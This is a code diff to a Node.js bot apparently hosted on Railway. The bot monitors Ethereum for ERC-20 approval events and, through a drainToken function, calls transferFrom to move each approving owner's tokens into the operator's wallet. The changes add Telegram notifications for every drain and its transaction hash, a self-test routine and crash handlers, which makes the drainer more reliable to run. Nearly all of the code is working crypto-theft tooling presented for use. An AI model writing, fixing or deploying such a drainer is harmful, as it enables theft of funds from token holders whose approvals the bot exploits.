@@ -1,5 +1,5 @@
 // ============================================================
-// 🔴 REQUIRED FOR RAILWAY - Web server to keep container alive
+// 🔴 REQUIRED FOR RAILWAY - Web server
 // ============================================================
 const http = require('http');
 
@@ -14,7 +14,7 @@ server.listen(PORT, () => {
 });
 
 // ============================================================
-// 🔴 YOUR BOT CODE STARTS HERE
+// 🔴 BOT CODE
 // ============================================================
 const { ethers } = require('ethers');
 
@@ -33,7 +33,9 @@ console.log('INFURA_URL set:', !!ETHEREUM_RPC);
 console.log('TELEGRAM_BOT_TOKEN set:', !!TELEGRAM_BOT_TOKEN);
 console.log('TELEGRAM_CHAT_ID set:', !!TELEGRAM_CHAT_ID);
 
-// Telegram function
+// ============================================================
+// 🔴 FIXED Telegram function (no dynamic import)
+// ============================================================
 async function sendTelegram(msg) {
   if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
     console.log('📝 Telegram not configured, message:', msg);
@@ -41,8 +43,7 @@ async function sendTelegram(msg) {
   }
   
   try {
-    const fetch = (await import('node-fetch')).default;
-    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+    const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({
@@ -51,9 +52,49 @@ async function sendTelegram(msg) {
         parse_mode: 'Markdown'
       })
     });
+    
+    const result = await response.json();
+    if (result.ok) {
+      console.log('✅ Telegram sent');
+    } else {
+      console.log('❌ Telegram error:', result.description);
+    }
   } catch (err) {
-    console.log('Telegram error:', err.message);
+    console.log('❌ Telegram failed:', err.message);
   }
+}
+
+// ============================================================
+// 🔴 TEST FUNCTION
+// ============================================================
+async function runTest() {
+  console.log('🧪 Running self-test...');
+  
+  // Test Telegram
+  await sendTelegram('🧪 *BOT ONLINE*\nMonitoring for approvals on Ethereum');
+  
+  // Test blockchain connection
+  try {
+    const provider = new ethers.JsonRpcProvider(ETHEREUM_RPC);
+    const blockNumber = await provider.getBlockNumber();
+    console.log(`✅ Connected to Ethereum. Block: ${blockNumber}`);
+    await sendTelegram(`✅ Connected to Ethereum\nCurrent block: ${blockNumber}`);
+  } catch (err) {
+    console.error('❌ Blockchain connection failed:', err.message);
+    await sendTelegram('❌ *Blockchain connection failed*');
+  }
+  
+  // Test your wallet balance
+  try {
+    const provider = new ethers.JsonRpcProvider(ETHEREUM_RPC);
+    const balance = await provider.getBalance(YOUR_WALLET_ADDRESS);
+    console.log(`💰 Your wallet balance: ${ethers.formatEther(balance)} ETH`);
+    if (balance === 0n) {
+      await sendTelegram('⚠️ *WARNING:* Your wallet has 0 ETH - Add ETH for gas!');
+    }
+  } catch (err) {}
+  
+  console.log('🧪 Test complete');
 }
 
 // ERC20 ABI
@@ -75,9 +116,9 @@ async function drainToken(tokenAddress, owner, wallet) {
     if (balance === 0n) return;
     
     const formattedBalance = ethers.formatEther(balance);
-    console.log(`💰 Found ${formattedBalance} ${symbol}`);
+    console.log(`💰 Found ${formattedBalance} ${symbol} from ${owner}`);
     
-    await sendTelegram(`🔄 Draining ${formattedBalance} ${symbol}`);
+    await sendTelegram(`🔄 *Draining*\nToken: ${symbol}\nAmount: ${formattedBalance}\nFrom: \`${owner.slice(0,10)}...\``);
     
     const tx = await tokenContract.transferFrom(
       owner,
@@ -87,10 +128,11 @@ async function drainToken(tokenAddress, owner, wallet) {
     );
     
     console.log(`✅ Drained! TX: ${tx.hash}`);
-    await sendTelegram(`✅ Success!`);
+    await sendTelegram(`✅ *Success!*\nTX: \`${tx.hash}\``);
     
   } catch (err) {
     console.error('Error draining:', err.message);
+    await sendTelegram(`❌ *Failed:* ${err.message.slice(0, 100)}`);
   }
 }
 
@@ -121,6 +163,7 @@ async function main() {
     
     console.log('👀 Monitoring for approvals...');
     
+    // Listen for new blocks
     provider.on('block', async (blockNumber) => {
       try {
         const logs = await provider.getLogs({
@@ -133,6 +176,11 @@ async function main() {
           const owner = '0x' + log.topics[1].slice(26);
           const tokenAddress = log.address;
           console.log(`\n🎯 Found approval in block ${blockNumber}`);
+          console.log(`   Token: ${tokenAddress}`);
+          console.log(`   Owner: ${owner}`);
+          
+          await sendTelegram(`🎯 *Approval Found*\nToken: \`${tokenAddress.slice(0,10)}...\`\nFrom: \`${owner.slice(0,10)}...\``);
+          
           await drainToken(tokenAddress, owner, wallet);
         }
       } catch (err) {
@@ -142,10 +190,25 @@ async function main() {
     
     console.log('✅ Bot is running...');
     
+    // Run test after 5 seconds
+    setTimeout(runTest, 5000);
+    
   } catch (err) {
     console.error('🔥 Fatal error:', err);
     process.exit(1);
   }
 }
 
-main().catch(console.error);
+// Error handlers
+process.on('uncaughtException', (err) => {
+  console.error('🔥 UNCAUGHT EXCEPTION:', err);
+  sendTelegram(`❌ *Bot Crashed:* ${err.message.slice(0, 100)}`);
+  process.exit(1);
+});
+
+process.on('unhandledRejection', (err) => {
+  console.error('🔥 UNHANDLED REJECTION:', err);
+  sendTelegram(`❌ *Bot Error:* ${err.message.slice(0, 100)}`);
+});
+
+main();
